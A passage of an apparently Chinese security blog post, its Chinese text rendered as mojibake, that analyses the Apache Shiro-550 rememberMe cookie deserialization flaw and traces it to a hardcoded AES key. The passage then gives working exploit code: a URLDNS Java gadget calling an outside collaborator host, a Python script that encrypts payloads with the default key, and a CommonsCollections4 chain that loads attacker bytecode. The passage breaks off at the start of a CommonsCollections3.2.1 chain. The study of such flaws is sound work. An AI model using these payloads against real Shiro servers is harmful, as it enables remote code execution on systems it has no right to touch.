class="code"><pre><span class="line">mvn compile</span><br><span class="line">mvn package</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆwaræ–‡ä»¶</p><h3 id="é…ç½®tomcat"><a href="#é…ç½®tomcat" class="headerlink" title="é…ç½®tomcat"></a>é…ç½®tomcat</h3><p>æ·»åŠ æ‰“åŒ…å¥½åçš„warå·¥ä»¶</p><p><a href="https://imgse.com/i/ppUO1nx"><img src="https://s1.ax1x.com/2023/03/21/ppUO1nx.png" alt="ppUO1nx.png"></a></p><p>æˆåŠŸå¯åŠ¨</p><p><a href="https://imgse.com/i/ppUOt4e"><img src="https://s1.ax1x.com/2023/03/21/ppUOt4e.png" alt="ppUOt4e.png"></a></p><p>å«Œé…ç½®è¿‡ç¨‹éº»çƒ¦çš„æœ‹å‹ä¹Ÿå¯ä»¥ç›´æ¥ç”¨githubä¸Šå·²æ‰“åŒ…å¥½çš„<a href="https://github.com/jas502n/SHIRO-550">waråŒ…</a></p><h2 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h2><h3 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h3><p>åœ¨ç™»å½•shiroæ—¶ï¼Œå¦‚æœç‚¹å‡»äº†rememberé€‰é¡¹ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªCookieæ¥ä¿å­˜ç™»å½•ä¿¡æ¯ï¼Œå®é™…ä¸Šåç«¯è¿›è¡Œçš„æ“ä½œæ˜¯å¯¹ç”¨æˆ·ç™»å½•ä¿¡æ¯è¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶åè¿›è¡ŒAESåŠ å¯†ï¼Œæœ€åè¿›è¡Œbase64åç”ŸæˆCookieã€‚å½“ä½ ä¸‹æ¬¡ç™»å½•æ—¶ï¼Œä¼šæºå¸¦æ‰€ç”Ÿæˆçš„Cookieè¿›è¡Œç™»å½•</p><p><a href="https://imgse.com/i/ppUOU9H"><img src="https://s1.ax1x.com/2023/03/21/ppUOU9H.png" alt="ppUOU9H.png"></a></p><p>é‚£ä¹ˆï¼Œå¦‚æœèƒ½æ§åˆ¶Cookieä¸ºæ¶æ„çš„åºåˆ—åŒ–ä»£ç ï¼Œç„¶åé€šè¿‡ç›¸åŒçš„åŠ å¯†åä¼ å…¥ï¼Œé‚£ä¹ˆåç«¯å°±ä¼šç›¸åº”çš„è§£å¯†ååºåˆ—åŒ–ï¼Œæœ€åæ‰§è¡Œæ‰€ä¼ å…¥çš„æ¶æ„ä»£ç </p><h3 id="åˆ©ç”¨æµç¨‹"><a href="#åˆ©ç”¨æµç¨‹" class="headerlink" title="åˆ©ç”¨æµç¨‹"></a>åˆ©ç”¨æµç¨‹</h3><p>å…¨æ–‡æœç´¢ä¸<code>Cookie</code>æˆ–è€…<code>RememberMe</code>ç›¸å…³çš„ç±»ä¸æ–¹æ³•</p><p>åœ¨<code>CookieRememberMeManager</code>ä¸­å‘ç°<code>getRememberedSerializedIdentity()</code>,å¤§æ¦‚æ‰§è¡Œçš„æ“ä½œå°±æ˜¯è·å–ä¼ å…¥çš„Cookieï¼Œå¯¹å…¶è¿›è¡Œbase64è§£å¯†</p><p><a href="https://imgse.com/i/ppUOa3d"><img src="https://s1.ax1x.com/2023/03/21/ppUOa3d.png" alt="ppUOa3d.png"></a></p><p>å¾€ä¸Šè·Ÿï¼Œåœ¨<code>AbstractRememberMeManager.getRememberedPrincipals</code>ä¸­è°ƒç”¨äº†<code>getRememberedSerializedIdentity()</code></p><p><a href="https://imgse.com/i/ppUOdgA"><img src="https://s1.ax1x.com/2023/03/21/ppUOdgA.png" alt="ppUOdgA.png"></a></p><p><code>getRememberedSerializedIdentity()</code>è°ƒç”¨<code>convertBytesToPrincipals()</code>å¯¹è·å–åˆ°base64è§£å¯†åçš„Cookieè¿›è¡Œè§£æ</p><p>è·Ÿè¿›<code>convertBytesToPrincipals()</code>ï¼Œæ“ä½œå¾ˆç›´è§‚ï¼Œå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œè§£å¯†åå†è°ƒç”¨<code>deserialize()</code>å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p><p><a href="https://imgse.com/i/ppUOwjI"><img src="https://s1.ax1x.com/2023/03/21/ppUOwjI.png" alt="ppUOwjI.png"></a></p><p>è·Ÿè¿›<code>deserialize()</code>ï¼Œè¿™é‡Œå…¶å®å°±æ˜¯è¿›è¡Œäº†ä¸€ä¸ªååºåˆ—åŒ–æ“ä½œï¼Œæ‰€ä»¥å¦‚æœç¯å¢ƒä¸‹æœ‰ccä¾èµ–æˆ–è€…å…¶ä»–çš„ä¸€äº›ä¾èµ–ï¼Œå°±å¯ä»¥ç›´æ¥åˆ©ç”¨æ¥æ‰“æ¼æ´äº†</p><p><a href="https://imgse.com/i/ppUODDP"><img src="https://s1.ax1x.com/2023/03/21/ppUODDP.png" alt="ppUODDP.png"></a></p><p>ä¸»è¦æ¥çœ‹çœ‹å®ƒè§£å¯†çš„ä¸€ä¸ªæ“ä½œæµç¨‹ï¼Œè·Ÿè¿›<code>decrypt()</code></p><p><code>AbstractRememberMeManager.decrypt()</code></p><p><a href="https://imgse.com/i/ppUOrHf"><img src="https://s1.ax1x.com/2023/03/21/ppUOrHf.png" alt="ppUOrHf.png"></a></p><p>ç»§ç»­è·Ÿï¼Œ<code>CipherService.decrypt()</code>ï¼Œæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºéœ€è¦åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºåŠ å¯†æ‰€éœ€è¦çš„Key</p><p><a href="https://imgse.com/i/ppUOyE8"><img src="https://s1.ax1x.com/2023/03/21/ppUOyE8.png" alt="ppUOyE8.png"></a></p><p>é‡ç‚¹å…³æ³¨keyçš„è·å–æµç¨‹ï¼Œå¦‚æœèƒ½è·å–åˆ°keyï¼Œå°±èƒ½é€šè¿‡ç›¸åŒçš„åŠ å¯†æ„é€ å‡ºæ¶æ„åºåˆ—åŒ–ä»£ç </p><p>è·Ÿè¿›<code>JcaCipherService.decrypt(InputStream in, OutputStream out, byte[] key, boolean ivPrepended)</code>ï¼Œè¿™é‡Œçš„è§£å¯†å¯†é’¥é€šè¿‡<code>getDecryptionCipherKey()</code>è·å¾—</p><p><a href="https://imgse.com/i/ppUOc4g"><img src="https://s1.ax1x.com/2023/03/21/ppUOc4g.png" alt="ppUOc4g.png"></a></p><p><a href="https://imgse.com/i/ppUO2CQ"><img src="https://s1.ax1x.com/2023/03/21/ppUO2CQ.png" alt="ppUO2CQ.png"></a></p><p>å‘ç°è¿”å›çš„keyæ˜¯ä¸€ä¸ªå¸¸é‡</p><p><a href="https://imgse.com/i/ppUOR3j"><img src="https://s1.ax1x.com/2023/03/21/ppUOR3j.png" alt="ppUOR3j.png"></a></p><p>å¾€ä¸Šæ‰¾ï¼Œçœ‹è¿™ä¸ªå¸¸é‡æ˜¯åœ¨å“ªé‡Œèµ‹å€¼çš„</p><p><a href="https://imgse.com/i/ppUOWgs"><img src="https://s1.ax1x.com/2023/03/21/ppUOWgs.png" alt="ppUOWgs.png"></a></p><p>ç»§ç»­å¾€ä¸Š</p><p><a href="https://imgse.com/i/ppUOIbV"><img src="https://s1.ax1x.com/2023/03/21/ppUOIbV.png" alt="ppUOIbV.png"></a></p><p>å¾€ä¸Šæ‰¾åœ¨å“ªå„¿è°ƒç”¨äº†<code>setCipherKey()</code>,æœ€ç»ˆæ˜¯åœ¨<code>AbstractRememberMeManager()</code>ä¸­æ‰¾åˆ°keyå…¶å®æ˜¯<code>DEFAULT_CIPHER_KEY_BYTES</code>è¿™ä¸ªå¸¸é‡</p><p><a href="https://imgse.com/i/ppUOTET"><img src="https://s1.ax1x.com/2023/03/21/ppUOTET.png" alt="ppUOTET.png"></a></p><p>è€Œè¿™ä¸ªå¸¸é‡æ˜¯ä¸€ä¸ªå›ºå®šçš„å€¼ï¼Œè€Œå®ƒçš„åŠ å¯†ç®—æ³•ï¼Œå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªAESç®—æ³•</p><p><a href="https://imgse.com/i/ppUXsMR"><img src="https://s1.ax1x.com/2023/03/21/ppUXsMR.png" alt="ppUXsMR.png"></a></p><h2 id="Expç¼–å†™"><a href="#Expç¼–å†™" class="headerlink" title="Expç¼–å†™"></a>Expç¼–å†™</h2><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>åœ¨è¿›è¡Œåˆ©ç”¨æ—¶ï¼Œéœ€è¦å…ˆåˆ é™¤æ‰Cookieä¸­çš„<code>JSESSIONID</code>ï¼Œå¦åˆ™æ˜¯ä¸ä¼šè¿›è¡Œåˆ°<code>rememberMe</code>çš„</p><h3 id="URLDNSé“¾æµ‹è¯•"><a href="#URLDNSé“¾æµ‹è¯•" class="headerlink" title="URLDNSé“¾æµ‹è¯•"></a>URLDNSé“¾æµ‹è¯•</h3><p><strong>exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IllegalAccessException, ClassNotFoundException, IOException, NoSuchFieldException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        URL url=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://o6vqlz6ye493cdll4txuv0odp4vujj.burpcollaborator.net&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class clazz=Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        Field hashcode=clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcode.set(url,<span class="number">123</span>);</span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        hashcode.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>AESåŠ å¯†</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_bin</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS=AES.block_size</span><br><span class="line">    pad=<span class="keyword">lambda</span> s:s+((BS-<span class="built_in">len</span>(s)%BS)*<span class="built_in">chr</span>(BS-<span class="built_in">len</span>(s)%BS)).encode()</span><br><span class="line">    key=<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode=AES.MODE_CBC</span><br><span class="line">    iv=uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor=AES.new(base64.b64decode(key),mode,iv)</span><br><span class="line">    ciphertext=base64.b64encode(iv+encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data=convert_bin(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(AES_enc(data))</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppUX6qx"><img src="https://s1.ax1x.com/2023/03/21/ppUX6qx.png" alt="ppUX6qx.png"></a></p><h3 id="Apache-CommonsCollections4-0åˆ©ç”¨é“¾"><a href="#Apache-CommonsCollections4-0åˆ©ç”¨é“¾" class="headerlink" title="Apache CommonsCollections4.0åˆ©ç”¨é“¾"></a>Apache CommonsCollections4.0åˆ©ç”¨é“¾</h3><p>ç”±äºshiroä¸­é»˜è®¤æ²¡æœ‰cc4ä¾èµ–ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨å¯¼å…¥ä¸€ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨cc2å°±èƒ½æ‰“</p><p><strong>exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value=&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"><span class="comment">//                templates.newTransformer();</span></span><br><span class="line">        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        chain.transform(1);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformerField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformerField.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppUXgZ6"><img src="https://s1.ax1x.com/2023/03/21/ppUXgZ6.png" alt="ppUXgZ6.png"></a></p><h3 id="Apache-CommonsCollections3-2-1åˆ©ç”¨é“¾"><a href="#Apache-CommonsCollections3-2-1åˆ©ç”¨é“¾" class="headerlink" title="Apache CommonsCollections3.2.1åˆ©ç”¨é“¾"></a>Apache CommonsCollections3.2.1åˆ©ç”¨é“¾</h3><p>ç”±äºshiroä¸­é»˜è®¤æ²¡æœ‰cc3.2.1ä¾èµ–ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨å¯¼å…¥ä¸€ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆæ‹¿cc6è¿›è¡Œæµ‹è¯•ï¼Œç»“æœå‘ç°æ¶æ„ä»£ç å¹¶æ²¡æœ‰æ‰§è¡ŒæˆåŠŸï¼ŒæŸ¥çœ‹tomcatæ—¥å¿—ï¼Œå‘ç°å¦‚ä¸‹æŠ¥é”™</p><p><a href="https://imgse.com/i/ppUXRIO"><img src="https://s1.ax1x.com/2023/03/21/ppUXRIO.png" alt="ppUXRIO.png"></a></p><p>åˆ†ææŠ¥é”™ï¼Œâ€œæ— æ³•åŠ è½½åˆ°Transformerâ€è¿™ä¸ªç±»</p><p>åœ¨cc6ä¸­æˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ªTransfomeræ•°ç»„å»è¿›è¡Œpayloadçš„æ„é€ </p><p><a href="https://imgse.com/i/ppUXfiD"><img src="https://s1.ax1x.com/2023/03/21/ppUXfiD.png" alt="ppUXfiD.png"></a></p><p>é‚£ä¹ˆä¸ºä»€ä¹ˆåŠ è½½ä¸åˆ°è¿™ä¸ªç±»å‘¢ï¼Ÿè·Ÿè¿›åˆ°å®ƒååºåˆ—åŒ–æ—¶çš„å¤„ç†ï¼Œåœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå®ƒå¹¶ä¸æ˜¯è°ƒç”¨åŸç”Ÿçš„ååºåˆ—åŒ–æ“ä½œï¼Œè€Œæ˜¯è°ƒç”¨<code>ClassResolvingObjectInputStream()</code>è¿›è¡Œä¸€ä¸ªå¤„ç†ï¼Œè€Œ<code>ClassResolvingObjectInputStream()</code>æ˜¯shiroé‡Œé¢è‡ªå®šä¹‰çš„ä¸€ä¸ªè¾“å…¥æµã€‚</p><p><a href="https://imgse.com/i/ppUXhJe"><img src="https://s1.ax1x.com/2023/03/21/ppUXhJe.png" alt="ppUXhJe.png"></a></p><p>è·Ÿè¿›<code>ClassResolvingObjectInputStream</code>,é—®é¢˜å‡ºåœ¨<code>resolveClass()</code></p><p><a href="https://imgse.com/i/ppUX4RH"><img src="https://s1.ax1x.com/2023/03/21/ppUX4RH.png" alt="ppUX4RH.png"></a></p><p>æ­£å¸¸åœ¨ååºåˆ—åŒ–ä¸­ï¼Œæ˜¯ä¸€å®šä¼šç»è¿‡<code>resolveClass()</code>å¤„ç†çš„</p><p>è€Œåœ¨<code>ClassResolvingObjectInputStream</code>ç±»ä¸­é‡å†™äº†<code>resolveClass()</code>ï¼Œåœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶å°±ä¼šè°ƒç”¨é‡å†™çš„<code>resolveClass()</code>è¿›è¡Œä¸€ä¸ªå¤„ç†</p><p>å¯¹æ¯”ä¸€ä¸‹åŸç”Ÿçš„<code>ObjectInputStream.resolveClass()</code></p><p><a href="https://imgse.com/i/ppUX5zd"><img src="https://s1.ax1x.com/2023/03/21/ppUX5zd.png" alt="ppUX5zd.png"></a></p><p>åŸç”Ÿçš„<code>resolveClass()</code>æ˜¯è°ƒç”¨<code>Class.forName</code>è¿›è¡Œä¸€ä¸ªç±»åŠ è½½ï¼Œè€Œshiroé‡å†™çš„<code>resolveClass()</code>æ˜¯è°ƒç”¨shiroè‡ªå®šä¹‰çš„<code>ClassUtils.forName</code>åŠé€†è¡Œç±»åŠ è½½</p><p>è·Ÿè¿›ClassUtils</p><p><a href="https://imgse.com/i/ppUXoQA"><img src="https://s1.ax1x.com/2023/03/21/ppUXoQA.png" alt="ppUXoQA.png"></a></p><p>å¯ä»¥å‘ç°ClassUtilsåŠ è½½ç±»æ—¶æ˜¯è°ƒç”¨<code>Classloader</code>è¿›è¡Œçš„ä¸€ä¸ªç±»åŠ è½½ï¼Œè€Œ<code>Classloader</code>æ˜¯ä¸èƒ½åŠ è½½æ•°ç»„ç±»çš„</p><p>å†å¾€åå¯¹å®ƒçš„åŸç†å°±ä¸å†å…·ä½“æ·±ç©¶äº†ï¼Œå› ä¸ºåé¢çš„åˆ†æå’Œå®‰å…¨å…¶å®å°±æ²¡æœ‰å¾ˆå¤§çš„å…³ç³»äº†ï¼Œæ˜¯Tomcatå†…ç½®çš„ä¸€äº›ç±»åŠ è½½çš„ç»†èŠ‚</p><p>expçš„æ„é€ ä¹Ÿå°±æ¯”è¾ƒç®€å•äº†ï¼Œåªè¦ä¸å‡ºç°æ•°ç»„ç±»å°±è¡Œäº†</p><p><strong>Exp</strong>(CC3+CC2+CC6)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> 